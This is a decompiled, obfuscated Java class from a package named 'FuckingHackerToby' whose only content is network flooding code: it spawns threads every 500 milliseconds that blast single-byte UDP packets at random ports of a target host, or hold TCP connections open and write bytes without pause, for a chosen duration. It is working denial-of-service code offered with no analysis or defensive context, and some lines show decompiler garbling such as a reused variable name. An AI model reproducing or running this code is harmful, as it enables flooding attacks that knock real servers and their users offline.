/*
 * Decompiled with CFR 0.150.
 */
package FuckingHackerToby;

import java.io.OutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;

public final class wa {
    private static final /* synthetic */ int ALLATORIxDEMO = 500;
    private static final /* synthetic */ int d = 1;

    private /* synthetic */ wa() {
        wa a2;
    }

    public static /* synthetic */ void ALLATORIxDEMO(String a2, long a3) {
        long l2 = System.currentTimeMillis();
        while (System.currentTimeMillis() - l2 < a3) {
            wa.H(a2);
            try {
                Thread.sleep(500L);
            }
            catch (InterruptedException interruptedException) {
                interruptedException.printStackTrace();
            }
        }
    }

    public static /* synthetic */ void H(String a2, int a32) {
        Runnable a32 = () -> {
            OutputStream outputStream;
            try {
                Socket socket = a32 = new Socket(a2, a32);
                outputStream = a32.getOutputStream();
                while (socket.isConnected() && !a32.isClosed()) {
                    byte[] arrby = new byte[1];
                    socket = a32;
                    OutputStream outputStream2 = outputStream;
                    outputStream2.write(arrby);
                    outputStream2.flush();
                    Thread.sleep(1L);
                }
            }
            catch (Exception a32) {
                System.err.println(a32);
                return;
            }
            outputStream.close();
            a32.close();
        };
        new Thread(a32).start();
    }

    public static /* synthetic */ void ALLATORIxDEMO(String a2, int a3, long a4) {
        long l2 = System.currentTimeMillis();
        while (System.currentTimeMillis() - l2 <= a4) {
            wa.H(a2, a3);
            try {
                Thread.sleep(500L);
            }
            catch (InterruptedException interruptedException) {
                interruptedException.printStackTrace();
            }
        }
    }

    public static /* synthetic */ void H(String a2) {
        Runnable runnable = () -> {
            int n2 = (int)(Math.random() * 65534.0) + 1;
            Object object = new InetSocketAddress(a2, n2);
            byte by = (byte)(Math.random() * 127.0);
            try {
                DatagramSocket datagramSocket = new DatagramSocket();
                byte[] arrby = new byte[1];
                arrby[0] = by;
                byte[] arrby2 = arrby;
                object = new DatagramPacket(arrby2, arrby2.length, (SocketAddress)object);
                DatagramSocket datagramSocket2 = datagramSocket;
                datagramSocket2.send((DatagramPacket)object);
                datagramSocket2.close();
                return;
            }
            catch (Exception exception) {
                System.err.println(exception);
                return;
            }
        };
        new Thread(runnable).start();
    }
}

